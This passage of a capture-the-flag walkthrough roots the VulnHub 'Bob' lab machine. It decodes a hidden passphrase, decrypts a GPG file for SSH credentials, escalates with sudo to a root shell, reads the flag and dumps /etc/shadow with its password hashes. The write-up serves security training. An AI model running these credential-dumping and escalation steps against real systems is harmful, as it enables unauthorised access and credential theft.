+<img src="18.hidden-password-in-plain-sight.png" alt="" /><figcaption>18.hidden-password-in-plain-sight</figcaption>
+</figure>
+<pre><code>-= Notes =-
+Harry Potter is my faviorite
+Are you the real me?
+Right, I&#39;m ordering pizza this is going nowhere
+People just don&#39;t get me
+Ohhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhh &lt;sea santy here&gt;
+Cucumber
+Rest now your eyes are sleepy
+Are you gonna stop reading this yet?
+Time to fix the server
+Everyone is annoying
+Sticky notes gotta buy em</code></pre>
+<ol type="1">
+<li>These are random strings</li>
+<li>This is in the same directory as the valuable item.</li>
+<li>I am out of options.</li>
+</ol>
+<p>The password is: “HARPOCRATES”.</p>
+<h2 id="open-gpg-file">Open GPG file</h2>
+<pre class="shell"><code>gpg --batch --passphrase HARPOCRATES -d bob.login.txt.gpg 
+gpg: AES.CFB encrypted data
+gpg: encrypted with 1 passphrase
+bob:b0bcat_
+</code></pre>
+<p>The password is b0bcat_.</p>
+<h2 id="ssh-as-bob">SSH as bob</h2>
+<figure>
+<img src="19.ssh-as-bob.png" alt="" /><figcaption>19.ssh-as-bob</figcaption>
+</figure>
+<h2 id="root-shell">Root Shell</h2>
+<pre class="shell"><code>hostname -I: 192.168.42.7 192.168.56.70 
+Thursday 23 December 2021 01:58:38 AM IST 2021.12.23 01:58:38
+f0c1s@kali:~/vuln-hubs/bob-1.0.1 $
+ssh bob@$RHOST -p 25468
+  __  __ _ _ _                        _____                          
+ |  \/  (_) | |                      / ____|                         
+ | \  / |_| | |__  _   _ _ __ __ _  | (___   ___ _ ____   _____ _ __ 
+ | |\/| | | | &#39;_ \| | | | &#39;__/ _` |  \___ \ / _ \ &#39;__\ \ / / _ \ &#39;__|
+ | |  | | | | |_) | |_| | | | (_| |  ____) |  __/ |   \ V /  __/ |   
+ |_|  |_|_|_|_.__/ \__,_|_|  \__, | |_____/ \___|_|    \_/ \___|_|   
+                              __/ |                                  
+                             |___/                                   
+
+
+bob@192.168.56.78&#39;s password: 
+Linux Milburg-High 4.9.0-4-amd64 #1 SMP Debian 4.9.65-3+deb9u1 (2017-12-23) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Thu Mar  8 23:49:12 2018 from 192.168.56.1
+bob@Milburg-High:~$ whoami
+bob
+bob@Milburg-High:~$ id
+uid=1001(bob) gid=1001(bob) groups=1001(bob),27(sudo)
+bob@Milburg-High:~$ groups
+bob sudo
+bob@Milburg-High:~$ sudo -l
+sudo: unable to resolve host Milburg-High: Connection refused
+[sudo] password for bob: 
+Matching Defaults entries for bob on Milburg-High:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User bob may run the following commands on Milburg-High:
+    (ALL : ALL) ALL
+bob@Milburg-High:~$ sudo bash -i
+sudo: unable to resolve host Milburg-High: Connection refused
+root@Milburg-High:/home/bob# whoami
+root
+root@Milburg-High:/home/bob# id
+uid=0(root) gid=0(root) groups=0(root)
+root@Milburg-High:/home/bob# cd /
+root@Milburg-High:/# ls -la
+total 88
+drwxr-xr-x  22 root root  4096 Mar  5  2018 .
+drwxr-xr-x  22 root root  4096 Mar  5  2018 ..
+drwxr-xr-x   2 root root  4096 Feb 21  2018 bin
+drwxr-xr-x   3 root root  4096 Feb 21  2018 boot
+drwxr-xr-x  18 root root  3040 Dec 22 13:51 dev
+drwxr-xr-x 114 root root  4096 Mar  8  2018 etc
+-rw-------   1 root root   335 Mar  5  2018 flag.txt
+drwxr-xr-x   6 root root  4096 Mar  4  2018 home
+lrwxrwxrwx   1 root root    29 Feb 21  2018 initrd.img -&gt; boot/initrd.img-4.9.0-4-amd64
+lrwxrwxrwx   1 root root    29 Feb 21  2018 initrd.img.old -&gt; boot/initrd.img-4.9.0-4-amd64
+drwxr-xr-x  15 root root  4096 Feb 21  2018 lib
+drwxr-xr-x   2 root root  4096 Feb 21  2018 lib64
+drwx------   2 root root 16384 Feb 21  2018 lost+found
+drwxr-xr-x   3 root root  4096 Feb 21  2018 media
+drwxr-xr-x   2 root root  4096 Feb 21  2018 mnt
+drwxr-xr-x   2 root root  4096 Feb 21  2018 opt
+dr-xr-xr-x 112 root root     0 Dec 22 13:51 proc
+drwx------  16 root root  4096 Feb 28  2018 root
+drwxr-xr-x  22 root root   660 Dec 22 15:28 run
+drwxr-xr-x   2 root root  4096 Feb 21  2018 sbin
+drwxr-xr-x   3 root root  4096 Mar  4  2018 srv
+dr-xr-xr-x  13 root root     0 Dec 22 14:50 sys
+drwxrwxrwt  10 root root  4096 Dec 22 15:22 tmp
+drwxr-xr-x  10 root root  4096 Feb 21  2018 usr
+drwxr-xr-x  12 root root  4096 Feb 28  2018 var
+lrwxrwxrwx   1 root root    26 Feb 21  2018 vmlinuz -&gt; boot/vmlinuz-4.9.0-4-amd64
+lrwxrwxrwx   1 root root    26 Feb 21  2018 vmlinuz.old -&gt; boot/vmlinuz-4.9.0-4-amd64
+root@Milburg-High:/# cat flag.txt
+CONGRATS ON GAINING ROOT
+
+        .-.
+       (   )
+        |~|       _.--._
+        |~|~:&#39;--~&#39;      |
+        | | :   #root   |
+        | | :     _.--._|
+        |~|~`&#39;--~&#39;
+        | |
+        | |
+        | |
+        | |
+        | |
+        | |
+        | |
+        | |
+        | |
+   _____|_|_________ Thanks for playing ~c0rruptedb1t
+root@Milburg-High:/# </code></pre>
+<h2 id="flag-flag.txt">flag /flag.txt</h2>
+<figure>
+<img src="20.flag.png" alt="" /><figcaption>20.flag</figcaption>
+</figure>
+<p>Rooted.</p>
+<h2 id="post-root">Post Root</h2>
+<h3 id="etcshadow">/etc/shadow</h3>
+<pre class="shell"><code>root@Milburg-High:/# cat /etc/shadow
+root:$6$Gki8PIx6$S6zxQ8pPsOJeakxaE8/o4FnIsgXdsFHm1uf70QOubnQWBKIlVsE99CL8/dsqlh0/fuiNZaXptU2SJ1fDRbH8A1:17599:0:99999:7:::
+daemon:*:17583:0:99999:7:::
+bin:*:17583:0:99999:7:::
+sys:*:17583:0:99999:7:::
+sync:*:17583:0:99999:7:::
+games:*:17583:0:99999:7:::
+man:*:17583:0:99999:7:::
+lp:*:17583:0:99999:7:::
+mail:*:17583:0:99999:7:::
+news:*:17583:0:99999:7:::
+uucp:*:17583:0:99999:7:::
+proxy:*:17583:0:99999:7:::
+www-data:*:17583:0:99999:7:::
+backup:*:17583:0:99999:7:::
+list:*:17583:0:99999:7:::
+irc:*:17583:0:99999:7:::
+gnats:*:17583:0:99999:7:::
+nobody:*:17583:0:99999:7:::
+systemd-timesync:*:17583:0:99999:7:::
+systemd-network:*:17583:0:99999:7:::
+systemd-resolve:*:17583:0:99999:7:::
+systemd-bus-proxy:*:17583:0:99999:7:::
+_apt:*:17583:0:99999:7:::
+Debian-exim:!:17583:0:99999:7:::
+rtkit:*:17583:0:99999:7:::
+dnsmasq:*:17583:0:99999:7:::
+avahi-autoipd:*:17583:0:99999:7:::
+messagebus:*:17583:0:99999:7:::
+usbmux:*:17583:0:99999:7:::
+speech-dispatcher:!:17583:0:99999:7:::
+lightdm:*:17583:0:99999:7:::
+pulse:*:17583:0:99999:7:::
+avahi:*:17583:0:99999:7:::
+saned:*:17583:0:99999:7:::
+c0rruptedb1t:$6$j5l5DMkY$BfqvgRmf5X6dpXdqeUue4AN4OxKwQY6I8nMxmrTmy1BupMhFBkMHGnl6pMC2b06zpVUA6YJMm7SHk4NrmEhHn1:17583:0:99999:7:::
+bob:$6$mwc2tuOb$TeB1IALW7IE4SFkvCH9Sls/KKtxv7oLotyqNHgfXIN9a7LuG/H6ii6iocMfwdDtCxfOEEZ6Pt9iSRtf52D9kZ0:17589:0:99999:7:::
+jc:$6$RJ.XN2vQ$T.MHaNdVoHuUxTJjgG1i4NEff6TliP7PlP0FT7jsmjXRHDhmd1cVQxGDdzuxi2ybcQPB1GPQT.zvoaexcRuXh0:17589:0:99999:7:::
+seb:$6$4.6B1rmh$iaH45IN/kqI4A8Yg0oeY74nXxcicIV3gplln3koT/h2T9qDbs6b0jFWyRyuP5f23OAIyNf5F2WwptKSoDvD4o1:17589:0:99999:7:::
+elliot:$6$lyiTlPzo$4PiESwZ0ySFbVE1bVnfoj2D7E7GfC8cFGSydW5wwXR9.LOrRx56CgXuhwIkUsLP.P/Edrz2YqcbMGqDzyohsT0:17599:0:99999:7:::
+sshd:*:17591:0:99999:7:::
+proftpd:!:17594:0:99999:7:::
+ftp:*:17594:0:99999:7:::
+</code></pre>
+<h2 id="how-to-root">How to root</h2>
+<ol type="1">
+<li>Find webshell</li>
+<li>Get reverse shell</li>
+<li>Find credentials</li>
+<li>Get SSH accesss</li>
+<li>Find secret and key script</li>
+<li>The key is first letter of each line.</li>
+<li>Crack the secret</li>
+<li>???</li>
+<li>Profit</li>
+</ol>
